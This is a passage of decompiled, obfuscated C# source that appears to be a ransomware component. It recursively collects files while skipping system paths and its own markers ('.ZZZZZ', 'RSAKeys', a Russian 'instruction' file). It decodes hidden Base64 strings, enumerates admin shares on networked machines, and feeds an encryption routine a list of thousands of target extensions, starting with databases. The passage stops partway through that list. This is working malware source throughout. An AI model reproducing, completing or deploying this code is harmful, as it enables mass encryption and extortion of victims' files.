using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SbziaiYStR;
using lDGzIQtUhAc;
using ruvgheOTqFmtgA;

namespace YzTymtbtgFABHvJvj;

internal class eqCksjvMyn
{
	public class ySVlKjOBHeCSRx
	{
		private static StringCollection kNNgzxCnEgdqkdf = new StringCollection();

		private static List<string> TVgqDILImQRy = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(joRKfFeYni("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("ECCKeys") && !text.Contains("Инструкция") && !text.EndsWith(".ZZZZZ") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(vDqPFVseLDSEcY)) || text.Contains(joRKfFeYni("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI=")))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(YBwlHZzHGdGB) * 1024.0 * 1024.0 && qshYTVIXevhyaj == "YES")
							{
								TVgqDILImQRy.Add(text);
							}
							else if (File.Exists(text) && qshYTVIXevhyaj == "NO")
							{
								TVgqDILImQRy.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				array3 = array2;
				foreach (string root2 in array3)
				{
					WalkDirectoryTree(root2);
				}
			}
			return TVgqDILImQRy;
		}
	}

	[CompilerGenerated]
	private sealed class CDdPzCkczWGjq
	{
		public string EAxeDjjiNnu;

		public bool _003CMain_003Eb__7(Process p)
		{
			return p.ProcessName == EAxeDjjiNnu;
		}
	}

	[CompilerGenerated]
	private sealed class ElTKddFbBIdK
	{
		public string[] PFFHDAwoyhOd;

		public void _003CMain_003Eb__8()
		{
			RPURcUKzFBlLnC.KIrWzzeZUlrxQ(PFFHDAwoyhOd);
		}
	}

	[CompilerGenerated]
	private sealed class LfcUXmRbDTUUl
	{
		public string zTURyzlPodn;

		public void _003CMapDrv_003Eb__26(int g)
		{
			Thread.Sleep(UIEwMIIeUW);
			vNjCRxJChaZG.Add("\\\\" + zTURyzlPodn + "\\" + (char)g + "$");
			try
			{
				if (aLMUqgosPdtj)
				{
					Console.WriteLine("\\\\" + zTURyzlPodn + "\\" + (char)g + "$");
				}
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private sealed class lNXckGIaucJ
	{
		public string JzJWvdQfojhDgaD;

		public bool _003CIsDriveNTFS_003Eb__2b(DriveInfo d)
		{
			return d.RootDirectory.Name == JzJWvdQfojhDgaD;
		}
	}

	[CompilerGenerated]
	private sealed class mfuVHdFCKTVlWV
	{
		public string fJsRzOwCSn;

		public void _003CEncodeOnTheWay_003Eb__2e()
		{
			JDlAMHFGKK(fJsRzOwCSn, new string[4833]
			{
				"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
				"sdf", "nsf", "fp7", "cat", "log", "$$$", "$db", "$efs", "$er", "^^^",
				"__a", "__b", "{pb", "~cw", "~hm", "0", "000", "001", "1", "101",
				"103", "108", "110", "113", "123", "128", "17t", "1CD", "1pe", "1ph",
				"1sp", "1st", "2", "2mg", "2Q0", "2QM", "3", "3d", "3d4", "3dd",
				"3df", "3df8", "3dm", "3dmdef", "3dp", "3dr", "3ds", "3dt", "3dw", "3dxml",
				"3fr", "3g2", "3ga", "3gp", "3gp2", "3me", "3MF", "3mm", "3pe", "3pr",
				"3w", "4dd", "4dl", "4dv", "4fs", "4w7", "5vw", "602", "73b", "73c",
				"73l", "7z", "7z001", "7z002", "7zip", "8", "86f", "89t", "89y", "8ba",
				"8bc", "8be", "8bf", "8bi8", "8bl", "8bs", "8bx", "8by", "8li", "8svx",
				"8xg", "8xk", "8xs", "8xt", "8xv", "9xt", "9xy", "a$v", "a00", "a01",
				"a02", "a2c", "a5l", "a5w", "a65", "aa", "aa3", "aac", "aaf", "aah",
				"aam", "aao", "aaui", "ab", "ab1", "ab3", "ab4", "ab65", "aba", "abbu",
				"abc", "abcd", "abf", "abi", "abk", "abkprj", "abp", "abt", "abw", "aby",
				"ac2", "ac3", "ac5", "aca", "acc", "accdc", "accde", "accdr", "accdt", "accft",
				"ACCTB", "ace", "acf", "acg", "ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings",
				"acrodata", "acroplugin", "acrypt", "act", "acz", "ad", "ada", "adb", "adc", "adcp",
				"add", "addism", "ade", "adf", "adi", "adif", "adoc", "ados", "adox", "adp",
				"adpb", "adr", "ads", "adt", "adu", "adv", "advs", "adx", "adz", "aea",
				"aec", "aep", "aepx", "aes", "aet", "afd", "afdesign", "afe", "aff", "afi",
				"afm", "afp", "aft", "agd", "agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec",
				"age3xsav", "age3xscn", "age3yrec", "age3ysav", "age3yscn", "aggr", "ahf", "ai", "aif", "aifb",
				"aiff", "aim", "ain", "AIO", "aip", "ais", "ait", "ak", "al", "al8",
				"ala", "alb3", "alb4", "alb5", "alb6", "alc", "ald", "aldf", "alf", "ali",
				"allet", "alt3", "alt5", "alz", "AM", "amb", "amc", "amf", "aml", "amm",
				"amr", "amsorm", "amt", "amu", "amx", "amxx", "an1", "an8", "anime", "anl",
				"anme", "ann", "ans", "ansr", "ansym", "anx", "aoi", "ap", "apa", "apalbum",
				"apd", "ape", "apf", "aph", "api", "apj", "apk", "aplibrary", "apnx", "apo",
				"app", "APPCACHE", "approj", "APPX", "apr", "apt", "apw", "apxl", "apz", "ar",
				"arc", "arch00", "archiver", "arduboy", "arff", "ari", "arj", "arn", "aro", "arr",
				"ars", "art", "arw", "as", "as$", "as3", "asa", "asc", "ascm", "ascx",
				"asd", "ase", "asf", "ashbak", "ashdisc", "ashprj", "ashx", "ask", "asl", "asm",
				"asmx", "asn", "asnd", "asp", "aspx", "asr", "asset", "ast", "asv", "asvx",
				"asx", "atf", "ath", "atl", "atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux",
				"av", "avc", "avhd", "avhdx", "avj", "avl", "avn", "avp", "avs", "AW",
				"awb", "awbr", "awd", "awdb", "awe", "awg", "awp", "aws", "awt", "aww",
				"awwp", "ax", "azf", "azs", "azw", "azw1", "azw3", "azw4", "azz", "azzx",
				"b", "b1", "b27", "b2a", "b5i", "b5t", "b64", "b6i", "b6t", "b6z",
				"ba", "ba6", "ba7", "ba8", "ba9", "bac", "back", "backup", "backupdb", "bad",
				"bafl", "bak", "bak~", "bak2", "bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj",
				"bau", "bax", "bay", "bbb", "bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz",
				"bc", "bc5", "bc6", "bc7", "bcc", "bcd", "bci", "bck", "bckp", "bcl",
				"bcm", "bcp", "bct", "bdb", "bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp",
				"bdr", "bdt2", "bdt3", "bean", "bed", "bfa", "bff", "bfx", "bgl", "bgt",
				"bgv", "bh", "bho", "bi8", "bib", "bibtex", "bic", "bif", "bifx", "big",
				"bik", "bil", "bim", "bin", "bina", "binary", "bionix", "BIT", "bizdocument", "bjl",
				"bjo", "bk", "bk!", "bk1", "bk2", "bk3", "bk4", "bk5", "bk6", "bk7",
				"bk8", "bk9", "bkc", "bkf", "bkg", "bkp", "bks", "bkup", "bkz", "blb",
				"bld", "blend", "blend1", "blend2", "blg", "blk", "blm", "bln", "blob", "blockplt",
				"blogthis", "blp", "bluebutton", "bm2", "bm3", "bmc", "bmf", "bmk", "bml", "bmm",
				"bmml", "bmpr", "bms", "bna", "bndl", "bnk", "boc", "bok", "boo", "book",
				"bookexport", "bop", "box", "bp1", "bp2", "bp3", "bpa", "bpb", "bpd", "bpdx",
				"bpf", "bphys", "bpj", "bpk", "bpl", "bplx", "bpm", "bpmc", "bpn", "bps",
				"bpw", "brain", "brd", "breaking_bad", "brf", "brh", "brl", "brn", "BROWSER", "brs",
				"brw", "brx", "bsa", "bsd", "bsdl", "bsk", "bso", "bsp", "bst", "btd",
				"btf", "btif", "btinstall", "BTL", "btm", "btoa", "btr", "btx", "BUD", "bul",
				"bundle", "bup", "burn", "burntheme", "bvd", "bvp", "bwa", "bwd", "bwf", "bwi",
				"bwp", "bws", "bwt", "bwz", "BXF", "bxx", "bz", "bz2", "bza", "bzabw",
				"bzip", "bzip2", "c", "c00", "c01", "c02", "c10", "c2e", "c3d", "c4p",
				"c6", "cadoc", "cae", "caf", "cag", "calca", "cam", "camm", "camproj", "cap",
				"capt", "capx", "car", "caro", "cas", "catproduct", "cav", "cawr", "cb7", "cba",
				"cbf", "cbg", "cbmap", "cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc",
				"cca", "ccc", "ccd", "ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd",
				"cd1", "cd2", "cdb", "cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl",
				"cdm", "cdml", "cdmm", "cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5",
				"cdr6", "cdrw", "cds", "cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef",
				"cel", "celtx", "cenon~", "cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd",
				"cfg", "cfp", "cfr", "cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp",
				"chg", "chi", "chk", "chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht",
				"chtml", "cib", "cida", "cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9",
				"ckp", "ckt", "cl2", "cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist",
				"clb", "cld", "clg", "clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk",
				"clkv", "clm", "clp", "clr", "cls", "clx", "cm10", "cm5", "cma", "cmap",
				"CMB", "cmbl", "cmf", "cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna",
				"cnf", "cng", "cnt", "cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS",
				"compositionmodel", "compositiontemplate", "con", "conf", "config", "contact", "converterx", "cp", "cp9", "CPA",
				"cpaa", "cpc", "cpd", "cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk",
				"cpmz", "cpp", "cpt", "cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb",
				"crd", "crds", "creole", "crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr",
				"crtx", "crw", "crwl", "cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall",
				"cryptra", "cs", "cs8", "csa", "csd", "cse", "CSG", "csh", "csi", "csl",
				"csm", "cso", "csp", "csr", "css", "cst", "csv", "ctb", "ctbl", "ctd",
				"cte", "ctf", "CTG", "ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3",
				"ctx", "ctxt", "cty", "cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva",
				"cvd", "cvj", "cvl", "cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr",
				"cws", "cww", "cwwp", "cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi",
				"cyo", "cys", "czi", "czip", "czp", "d", "d00", "d01", "d3dbsp", "d64",
				"d88", "da0", "da2", "daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf",
				"dag", "dal", "dam", "dao", "dap", "dar", "das", "daschema", "dash", "dat",
				"DATA", "database", "datx", "dax", "dayzprofile", "dazip", "db_journal", "db0", "db3", "dba",
				"dbb", "dbc", "dbcrypt12", "dbcrypt8", "dbd", "DBF", "dbfv", "dbgsym", "db-journal", "dbk",
				"dbr", "dbs", "db-shm", "dbt", "dbv", "db-wal", "dc2", "dc4", "dca", "dcb",
				"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
				"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
				"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
				"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
				"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
				"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
				"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
				"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
				"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
				"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
				"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
				"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
				"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
				"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
				"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
				"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
				"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
				"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
				"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
				"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
				"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
				"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
				"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
				"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
				"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
				"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
				"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
				"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
				"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
				"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
				"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
				"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
				"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "EPF",
				"epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub", "epw",
				"eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err", "ersx",
				"es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm", "esp",
				"esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt", "ets",
				"ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p", "ev3s",
				"evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc", "exd",
				"exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez", "ezc",
				"ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90", "f96",
				"fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta", "fax",
				"fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw", "fcd",
				"fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct", "fd",
				"fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds", "fdseq",
				"fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff", "ffa",
				"ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx", "fg3",
				"fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin", "fingnet",
				"fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg", "flib",
				"flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp", "fls",
				"flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat", "fmc",
				"fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk", "fnf",
				"fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol", "folio",
				"folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3", "fp4",
				"fp5", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk", "fplinkbar", "fpp",
				"fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag", "frameset", "frd",
				"frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs", "fsa", "fsc",
				"fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10", "ft11", "ft7",
				"ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw", "ful", "fwbackup",
				"fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo", "fxp", "fxr",
				"fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m", "g41", "ga3",
				"gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1", "gb2", "gbi",
				"gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca", "gcd", "gcg",
				"gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable", "gdc", "gdf",
				"GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom", "gen", "genbank",
				"geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs", "gfx", "ggb",
				"ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh", "gla", "gld",
				"glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl", "gml", "gmp",
				"gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3", "gp4", "gpd",
				"gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan", "gpx", "gpz",
				"gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey", "grf", "grib",
				"grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr", "grs", "grt",
				"grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet", "gslides", "gsm",
				"GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp", "gts", "gui",
				"guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl", "gxt", "gz",
				"gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11", "h12", "h13",
				"h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o", "h2w", "h3m",
				"h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml", "hbk", "hbl",
				"hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr", "hcu", "hcw",
				"hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl", "hdpmx", "hds",
				"hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex", "hfd", "hfs",
				"hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb", "HKF", "hkx",
				"hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3", "hml", "hmskin",
				"hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2", "hpd", "hpj",
				"hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx", "hs", "hs2",
				"hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg", "htm", "htm~",
				"html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc", "HVE", "hvpl",
				"hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN", "hxq", "hxr",
				"hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02", "i5z", "iab",
				"iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb", "ibcd", "ibd",
				"ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo", "icbu", "icc",
				"icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics", "icst", "icxs",
				"id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml", "idp", "idx",
				"ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff", "ifiction", "ifm",
				"ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr", "ihf", "ihp",
				"ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg", "ilogicvb", "ima",
				"image", "imd", "img", "imp", "imr", "imt", "imz", "in", "INBOX", "INC",
				"incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp", "indt", "inf",
				"info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins", "inss", "installhelper",
				"insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias", "ipd", "ipf",
				"iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock", "irp", "irr",
				"irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso", "ispc", "ispx",
				"ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm", "itmsp", "itmz",
				"itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc", "ivd", "ivs",
				"ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj", "iwtpl", "iwxdata",
				"ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar", "jasper", "jav",
				"java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr", "jc", "jclic",
				"JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif", "JFM", "jgcscs",
				"jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp", "jnb", "jnt",
				"joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg", "jpf", "jpg",
				"jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint", "JRS", "jrxml",
				"js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx", "jtbackup", "jtd",
				"jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww", "k25", "k3b",
				"kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2", "kdb", "kdbx",
				"kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi", "kexic", "kexis",
				"key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp", "kgtemp", "kid",
				"kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno", "knt", "kos",
				"kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd", "ksm", "ksp",
				"kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp", "l", "l01",
				"l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat", "latex", "lav",
				"lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx", "lcb", "lcd",
				"lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldif", "lef", "lev",
				"lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf", "lgh", "lgi", "lgl",
				"lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life", "lin", "list", "lit",
				"litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb", "llv", "llx", "LM",
				"lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt", "lnx", "LO_", "loc",
				"localstorage", "LOG1", "logonxp", "lok", "lot", "lp", "lp2", "lp7", "lpa", "lpc",
				"lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd", "lpp", "lpx", "lqm", "lrcat",
				"lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit", "ls3", "ls5", "lsa", "lsd",
				"lsf", "lsl", "lsp", "lsr", "lst", "lsu", "ltcx", "ltm", "ltr", "LTS",
				"ltx", "lua", "lud", "lut", "lutx", "lvd", "lvivt", "lvl", "lvm", "lvw",
				"lw4", "lwd", "lwo", "lwp", "lwx", "lx01", "lxf", "lxk", "ly", "lyt",
				"lyx", "m", "m13", "m14", "m2", "m2ts", "m3u", "m3u8", "m4a", "m4p",
				"m4u", "m4v", "m7p", "maca", "maf", "mag", "mai", "maker", "maml", "man",
				"manu", "map", "mapimail", "MAPSTYLE", "maq", "mar", "marc", "markdn", "mars", "marshal",
				"mas", "mass", "mat", "mav", "max", "maxfr", "maxm", "mba", "mbbk", "mbd",
				"mbf", "mbg", "mbi", "mbox", "mbp", "mbx", "mc1", "mc9", "mcat", "mcd",
				"mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp", "mcrp", "mcw", "mcx", "md",
				"md0", "md1", "md2", "md3", "md5", "md8", "mdbackup", "mdbhtml", "mdc", "mdccache",
				"mdd", "mddata", "mdg", "mdi", "mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn",
				"mds", "mdsx", "MDT", "mdx", "MDZ", "mecontact", "med", "mef", "meg", "mega",
				"meh", "mell", "mellel", "mem", "menc", "menu", "meo", "merlin2", "met", "METADATA",
				"metadata_never_index", "mex", "mf", "mf4", "mfa", "mfe", "mfl", "mfo", "mfp", "mft",
				"mfu", "mfv", "mfw", "mga", "mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht",
				"mhtenx", "mhtmlenx", "mi", "mic", "mid", "mif", "mim", "mime", "mindnode", "miniso",
				"mip", "mission", "mix", "mjd", "mjdoc", "mjk", "mkd", "mke", "mkv", "mla",
				"mlb", "mlc", "mlj", "mlm", "mls", "mlsxml", "mlx", "mm", "mm6", "mm7",
				"mm8", "mmap", "mmc", "mmd", "mme", "mmf", "mmjs", "mml", "mmm", "mmo",
				"mmp", "mmsw", "mmw", "mnc", "mng", "MNI", "mnk", "mno", "mny", "mo",
				"mobi", "mod", "MODEL", "MOF", "moho", "mol", "money", "moneywell", "mos", "mosaic",
				"mov", "movie", "mox", "moz", "mp1", "mp2", "mp4v", "mpa", "mpd", "mpe",
				"mpeg", "mpf", "mpg", "mph", "mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge",
				"mpr", "mps", "mpt", "mpv", "mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg",
				"mru", "mrw", "mrwref", "ms", "ms10", "msb", "msc", "msct", "msd", "mse",
				"msf", "msg", "mshc", "msie", "msim", "msl", "mso", "msor", "msp", "msq",
				"mss", "ms-tnef", "msw", "mswd", "mtdd", "mte", "mtf", "mtff", "mth", "MTL",
				"mtm", "mtml", "mto", "mtp", "mts", "mtw", "mtx", "mtxt", "mud", "mug",
				"mui", "mum", "mup", "mvd", "mvdx", "mvex", "mvm", "mw", "mwb", "mwd",
				"mwf", "mwii", "mwpd", "mwpp", "mws", "mwx", "mx", "mxad", "mxc2", "mxd",
				"mxg", "mxi", "mxl", "mxp", "myd", "mydocs", "myi", "myo", "mz", "n3",
				"nam", "names", "nap", "narrative", "nas", "nav", "navmap", "nb", "nb7", "nba",
				"nbak", "nbd", "nbe", "nbf", "nbi", "nbk", "nbp", "nbs", "nbu", "nc",
				"ncd", "ncf", "nco", "ncorx", "nct", "nd", "nda", "ndb", "ndd", "ndif",
				"ndk", "ndl", "ndr", "nds", "ndx", "ne1", "ne3", "nef", "nessus", "net",
				"neta", "netspd", "netspm", "NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs",
				"nfs11save", "ng", "NGR", "nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP",
				"NLT", "nma", "nmbtemplate", "nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni",
